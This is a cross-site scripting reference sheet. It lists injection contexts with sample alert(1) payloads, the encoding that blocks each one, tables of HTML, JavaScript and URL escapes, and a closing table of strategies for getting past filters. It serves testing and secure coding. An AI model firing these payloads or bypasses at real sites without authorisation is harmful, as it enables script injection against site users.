# XSS Context and Encoding Reference

## Injection Contexts

### 1. HTML Body Context
```html
<div>USER_INPUT</div>
<p>Search results for: USER_INPUT</p>
```
**Payload:** `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`
**Blocked by:** HTML entity encoding of `<` and `>`

### 2. HTML Attribute Context
```html
<input value="USER_INPUT">
<div class="USER_INPUT">
<img alt="USER_INPUT">
```
**Payload:** `" onmouseover="alert(1)` or `"><script>alert(1)</script>`
**Blocked by:** HTML entity encoding of `"` (or `'` for single-quoted attributes)

### 3. Unquoted Attribute Context
```html
<input value=USER_INPUT>
```
**Payload:** `x onmouseover=alert(1)` (space breaks out of attribute)
**Blocked by:** Attribute quoting + encoding

### 4. JavaScript String Context
```javascript
var search = 'USER_INPUT';
var data = "USER_INPUT";
```
**Payload:** `';alert(1)//` or `\';alert(1)//`
**Blocked by:** JS string escaping (`\` before `'` and `"`)

### 5. JavaScript Template Literal Context
```javascript
var msg = `Hello USER_INPUT`;
```
**Payload:** `${alert(1)}` (template literal expression injection)
**Blocked by:** Escaping `$`, `{`, and backticks

### 6. URL/href Context
```html
<a href="USER_INPUT">Click here</a>
<iframe src="USER_INPUT">
```
**Payload:** `javascript:alert(1)` or `data:text/html,<script>alert(1)</script>`
**Blocked by:** URL scheme validation (allow only http/https)

### 7. CSS Context
```html
<div style="color: USER_INPUT">
<style>.class { background: USER_INPUT }</style>
```
**Payload:** `expression(alert(1))` (IE only) or `url(javascript:alert(1))` (older browsers)
**Modern browsers:** CSS XSS mostly mitigated, but check for CSS injection → data theft

### 8. HTML Comment Context
```html
<!-- USER_INPUT -->
```
**Payload:** `--><script>alert(1)</script><!--`
**Blocked by:** Stripping `-->`

## Encoding Types

### HTML Entity Encoding
| Char | Named | Numeric | Hex |
|------|-------|---------|-----|
| `<` | `&lt;` | `&#60;` | `&#x3c;` |
| `>` | `&gt;` | `&#62;` | `&#x3e;` |
| `"` | `&quot;` | `&#34;` | `&#x22;` |
| `'` | `&#39;` | `&#39;` | `&#x27;` |
| `&` | `&amp;` | `&#38;` | `&#x26;` |
| `/` | — | `&#47;` | `&#x2f;` |

### JavaScript Encoding
| Char | Escape | Unicode | Hex |
|------|--------|---------|-----|
| `'` | `\'` | `\u0027` | `\x27` |
| `"` | `\"` | `\u0022` | `\x22` |
| `\` | `\\` | `\u005c` | `\x5c` |
| `/` | `\/` | `\u002f` | `\x2f` |
| `<` | — | `\u003c` | `\x3c` |
| `>` | — | `\u003e` | `\x3e` |

### URL Encoding
| Char | Encoded | Double Encoded |
|------|---------|----------------|
| `<` | `%3C` | `%253C` |
| `>` | `%3E` | `%253E` |
| `"` | `%22` | `%2522` |
| `'` | `%27` | `%2527` |
| `/` | `%2F` | `%252F` |
| `\` | `%5C` | `%255C` |
| space | `%20` or `+` | `%2520` |

## Bypass Strategies by Encoding

| Encoding Applied | Bypass Strategy |
|-----------------|-----------------|
| HTML entity encoding `<>` | Break out of attribute context instead |
| Attribute encoding `"` | Try single quotes if not encoded |
| JS string escaping `\'` | Try `</script>` to break out of script block |
| URL encoding | Try double encoding if app decodes twice |
| All HTML/JS encoded | Try DOM-based XSS (client-side processing) |
| Blacklist filtering | Try alternative tags, event handlers, or encoding |
| Input stripped entirely | Try mutation XSS or polyglot payloads |
